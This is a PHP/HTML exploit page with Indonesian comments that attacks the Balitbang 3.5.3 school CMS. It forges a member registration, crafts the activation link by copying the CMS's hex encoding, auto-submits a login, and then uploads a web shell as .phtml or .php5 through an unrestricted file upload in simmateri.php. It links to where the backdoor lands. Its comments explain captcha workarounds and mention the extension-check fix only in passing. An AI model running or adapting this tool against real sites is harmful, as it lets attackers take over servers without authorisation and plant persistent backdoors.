<html>
<!---
// script ini dibuat berdasarkan iseng saja... :)
// by. kitasemua
// --------------------------
// Simpan script ini dengan nama: test.php
// - Jika captcha tidak muncul, buka inspect element, arahin cursor ke captcha, ganti link captcha "/functions/captcha/captcha.php" -> "/functions/spam.php"
// - Jika bypass login gagal, silahkan login manual, kemudian lanjut upload shellnya
// - Format shell: *.phtml, *.php5
// --------------------------
// Bugs terletak pada /functons/simmateri.php dan /functions/simmateriguru.php
// Cara menutup bugs ini: gunakan fungsi batasan ekstensi file seperti di /functions/simlapguru.php
// --------------------------
// Tunggu Tutorial selanjutnya "Bypass $_SESSION untuk Lokomedia, Balitbang, F0rmulaCMS".
// --------------------------
-->
<head>
<title>Balitbang 3.5.3</title>
</head>
<style type="text/css">
input[type=text],input[type=code],input[type=password]{
    border:1px solid #c0c0c0;
    height:24px;
    padding:5px;
}
</style>
<body>
<?php
function hex($str='',$code='') {
  if(($code>=0)and($code<100)) {
    $t .=dechex(strlen($str)+$code)."g";
    $str=strrev($str);
    for($i=0;$i<=strlen($str)-1;$i++) {
      $t .=dechex(ord(substr($str,$i,1))+$code);
    }
  }
  return $t;
}
function unhex($str='',$code='') {
  $all=explode("g",$str);
  $head=hexdec($all[0])-$code;
  $content=$all[1];
  if($head==(strlen($content)/2)) {
    for($i=0;$i<=$head-1;$i++) {
      $t .=chr(hexdec(substr($content,$i*2,2))-$code);
    }
    $t =strrev($t);
  }
  return $t;
}
$target = $_GET['target'];
$ur_target = $target."/member/membersave.php";
$ur_upload = $target."/functions/simmateri.php";
$captcha = $target."/functions/captcha/captcha.php";
$ur_login = $target."/member/ajax_login.php";
$userx = $_GET['n'];
$passx = $_GET['p'];
if(isset($_POST['next'])){
    $tar = $_POST['tar'];
    $n = $_POST['n'];
    $p = $_POST['p'];
    header("Location: test.php?load=daftar&n=".$n."&p=".$p."&target=".$tar."");
}
echo "CSRF Regstration Form + Shell Uploader (Balitbang 3.5.3)<hr>";
?>
<form method="post" action="" enctype="multipart/form-data">
<table id=tablebaru cellspacing='1' cellpadding='3'>
    <tr>
        <td>target</td>
        <td>:</td>
        <td><input type="text" name="tar" size="61" placeholder='http://'/></td>
    </tr>
    <tr>
        <td>username</td>
        <td>:</td>
        <td><input type="text" name="n" size="61"/></td>
    </tr>
    <tr>
        <td>password</td>
        <td>:</td>
        <td><input type="text" name="p" size="61"/></td>
    </tr>
    <tr>
        <td></td>
        <td></td>
        <td><input type="submit" name="next" value="NEXT &raquo;"/></td>
    </tr>
</table>
</form>
<hr>
<?php if(isset($_GET['load']) && $_GET['load'] == "daftar"){
    $asli = hex($userx,"82");
    $pass = hex($passx,"82");
    echo "username : <b>$userx</b><br>";
    echo "password : <b>$passx</b><hr>";
?>
<form name='formID' action="<?php echo $ur_target;?>" method='post' target='iframe'>
<input type=hidden name='userid' value='<?php echo hex("simtambah,","82");?>'>
<input type=hidden name='name' value='dal0vez'/>
<input type=hidden name='username' value='<?php echo $userx;?>'/>
<input type=hidden name='password' value='<?php echo $passx;?>'/>
<input type=hidden name='email' value='abc@abc.abc'/>
<input type=hidden name='kelamin' value='m'/>
<input type=hidden name='jenis' value='Tamu'>
<input type=hidden name='kelas' value=''/>
<input type=hidden name='hari' value='01'/>
<input type=hidden name='bulan' value='01'/>
<input type=hidden name='tahun' value='1995'/>
<input type=hidden name='nis' value=''/>
<input type=hidden name='pertanyaan' value='1'/>
<input type=hidden name='jawaban' value='1'/>
<input type=hidden name='kerja' value='Guru'/>
<input type=hidden name='alamat' value='jauh'/>
<input type=hidden name='sekolah' value='terserah'/>
<input type=hidden name='telp' value='0'/>
<input type=hidden name='blog' value=''/>
<input type=hidden name='tentang' value='terserah'/>
<input type=hidden name='country' value='INDONESIA'/>
<input type=hidden name='stprofil' value='open'/>
<input type=hidden name='stblog' value='on'/>
<table>
    <tr>
        <td colspan="2" valign="top"><img src='<?php echo $captcha;?>' width='162' height="85"></td>
        <td rowspan="2" valign="top"><i>&raquo; capture target...</i><br><iframe name='iframe' width='310' height='90' style="border:1px solid #c0c0c0;"></iframe></td>
    </tr>
    <tr>
        <td valign="top"><input type='text' name='code' size='12' placeholder="captcha"/></td>
        <td valign="top"><input type=submit name='submit' value='GO &raquo;'/></td>
    </tr>
</table>
</form>
<?php
echo "<!--
ini kode registrasinya: valid/index.php?id=".$asli."&p=".$pass."
-->
";
echo "Langkah selanjutnya:<br>1. Setelah registrasi berhasil, <input type='button' value='klik disini' onclick=\"verif.location.href='".$target."/valid/index.php?id=".$asli."&p=".$pass."'\"/> untuk aktivasi/verifikasi!.
<br><i>&raquo; capture target...</i><br><iframe name='verif' width='480' height='90' style='border:1px solid #c0c0c0;'></iframe><br>2. Langkah terakhir, Upload backdoornya <input type='button' onclick=\"window.location.href='test.php?load=upload&n=".$userx."&p=".$passx."&target=".$target."'\" value='lewat sini brade!!'/><hr>";
} else if(isset($_GET['load']) && $_GET['load'] == "upload"){
?>
<script type="text/javascript">
window.onload = function(){
  document.forms['login_form'].submit()
 
}
function setURL(url){
    document.getElementById('verif').src = url;
}
</script>
<form method="post" action="<?php echo $ur_login;?>" target='autologin' name='login_form'>
    <input type='hidden' name='user_name' value="<?php echo $userx;?>"/>
    <input type='hidden' name='password' value="<?php echo $passx;?>"/>
    Jika tidak bisa login dihalaman member, <input type='submit' name='submit' value='Klik disini untuk bikin SESSION'/>
</form>
<div style='margin-top:-20px;'>
<iframe name='autologin' width='30' height='30' style="border:0;"></iframe>
</div>
<form action='<?php echo $ur_upload;?>' method='post' enctype="multipart/form-data" target='golink'>
<input type='hidden' name='pesan' value='abcabcabc'/></td>
<table cellspacing='1' cellpadding='3'>
    <tr>
        <td valign='top'>File</td>
        <td valign='top'>:</td>
        <td valign='top'><input type='file' name='file'></td>
        <td valign='top' align='right'><input type='submit' value=' Simpan '/></td>
    </tr>
    <tr>
        <td valign='top' colspan="4"><i>&raquo; capture target...</i><br><iframe name='golink' width='475' height='150' style="border:1px solid #c0c0c0;"></iframe></td>
    </tr>
    <tr>
        <td valign='top' colspan="4">
        hasil upload (.php5): <a href="<?php echo $target."/tugas/tgs-ganteng.php5";?>" target="_blank"><?php echo $target."/tugas/tgs-ganteng.php5";?></a><br>
        hasil upload (.phtml): <a href="<?php echo $target."/tugas/tgs-ganteng.phtml";?>" target="_blank"><?php echo $target."/tugas/tgs-ganteng.phtml";?></a></td>
    </tr>
</table>
<input type=hidden name='st' value='ganteng'>
<input type=hidden name='nis' value=''>
<input type=hidden name='idtugas' value=''>
</form>
<hr>
<?php } ?>
</body>
</html>